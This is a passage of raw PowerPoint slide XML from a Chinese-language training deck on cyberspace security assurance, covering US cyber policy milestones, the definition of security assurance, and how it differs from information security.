          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>奥巴马任命网络安全专家担任“网络沙皇”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="矩形 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6372836" y="3722825"/>
            <a:ext cx="1155957" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0"/>
              <a:t>2011</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0"/>
              <a:t>5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>月</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="36" name="直接箭头连接符 35"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="31" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6950814" y="4061379"/>
            <a:ext cx="1" cy="846641"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="57150">
            <a:solidFill>
              <a:srgbClr val="0066FF"/>
            </a:solidFill>
            <a:tailEnd type="triangl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5596457" y="4963948"/>
            <a:ext cx="2252540" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间国际战略</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="矩形 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5350955" y="5333412"/>
            <a:ext cx="3325501" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>明确了针对网络攻击的指导原则</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="矩形 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7763160" y="4154846"/>
            <a:ext cx="902811" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>……</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="251520" y="851897"/>
            <a:ext cx="8208912" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>网络空间安全</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>网络空间安全保障（美国概况）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26737454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down)">
                                      <p:cBhvr>
                                        <p:cTn id="39" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="18"/>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down)">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additive="base">
                                        <p:cTn id="47" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="22"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="4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additive="base">
                                        <p:cTn id="53" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="23"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="54" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="23"/>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 calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="57" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="25"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="5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 calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="63" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="26"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="6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27"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="69" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="27"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="70" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="27"/>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 calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="73" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="30"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7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1"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="79" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8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6"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="85" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="36"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="86" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="36"/>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38"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="89" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="38"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="90" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="38"/>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39"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="93" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="39"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="94"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40"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="99" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="40"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="100"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7" grpId="0"/>
      <p:bldP spid="20" grpId="0"/>
      <p:bldP spid="22" grpId="0"/>
      <p:bldP spid="25" grpId="0"/>
      <p:bldP spid="26" grpId="0"/>
      <p:bldP spid="30" grpId="0"/>
      <p:bldP spid="31" grpId="0"/>
      <p:bldP spid="38" grpId="0"/>
      <p:bldP spid="39" grpId="0"/>
      <p:bldP spid="4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934244" y="980728"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全保障是一种立体保障</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2457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1926250"/>
            <a:ext cx="6840537" cy="406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57799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additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="24579"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="245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683568" y="908720"/>
            <a:ext cx="7992888" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识域：网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全保障概念与模型</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43011" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="395536" y="1916832"/>
            <a:ext cx="8604448" cy="1872208"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>知识子域：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>安全保障</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>理解</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>安全保障的概念</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>理解</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>安全保障与信息安全、信息系统安全的区别</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34929526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anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11"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301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anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="15"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30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标题 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="934907"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全保障定义</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="内容占位符 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="1628800"/>
            <a:ext cx="8517939" cy="2088232"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>防止信息泄露、修改和破坏；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>检测入侵行为，计划和部署针对入侵行为的防御措施；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>采用安全措施和容错机制在遭受攻击的情况下保证机密性、私密性、完整性、抗抵赖性、真实性、可用性和可靠性；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>修复信息和信息系统所遭受的破坏。</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6136" y="3932380"/>
            <a:ext cx="2841681" cy="2144581"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30900498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54174" y="1904340"/>
            <a:ext cx="1210588" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>信息安全</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1293906" y="2564904"/>
            <a:ext cx="906017" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>重    点</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="9" name="直接连接符 8"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1109958" y="3068960"/>
            <a:ext cx="7272808" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="28575">
            <a:solidFill>
              <a:srgbClr val="0033CC"/>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718470" y="1891847"/>
            <a:ext cx="1210588" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全保障</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="11" name="直接连接符 10"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1109958" y="2492896"/>
            <a:ext cx="7272808" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="28575">
            <a:solidFill>
              <a:srgbClr val="0033CC"/>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3054174" y="2564904"/>
            <a:ext cx="1338828" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>保护、防御</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="矩形 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5430438" y="2578787"/>
            <a:ext cx="2081019" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>保护、检测和响应</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="直接连接符 13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
